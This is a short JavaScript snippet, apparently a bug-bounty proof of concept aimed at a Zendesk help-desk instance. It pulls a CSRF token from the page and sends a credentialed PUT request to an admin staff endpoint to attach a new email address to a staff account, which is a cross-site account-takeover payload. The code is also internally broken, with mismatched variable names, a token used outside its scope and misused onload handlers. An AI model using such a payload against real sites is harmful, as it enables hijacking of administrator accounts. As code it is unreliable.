
function loadDoc2() {
    var xhttp = new XMLHttpRequest();
    xhr.open('GET','https://hackerone5759.zendesk.com/agent',true);
    const { content } = document.querySelector('meta[name="csrf-token"]'); 
    xhttp.withCredentials = true;
}

window.onload = loadDoc2();

function loadDoc1() {
    var xhr = new XMLHttpRequest();
    xhr.open('PUT','https://hackerone5759.zendesk.com/api/admin/private/staff/19845800449181',true);
    xhr.setRequestHeader('Content-type','application/json');
    xhr.setRequestHeader('X-Csrf-Token',content);
    xhr.withCredentials = true;
    xhr.send('{"user":{},"emails":[{"id":"0","value":"tesdt@tesdt.com","_action":"create"}]}');
}

window.onload = loadDoc1();
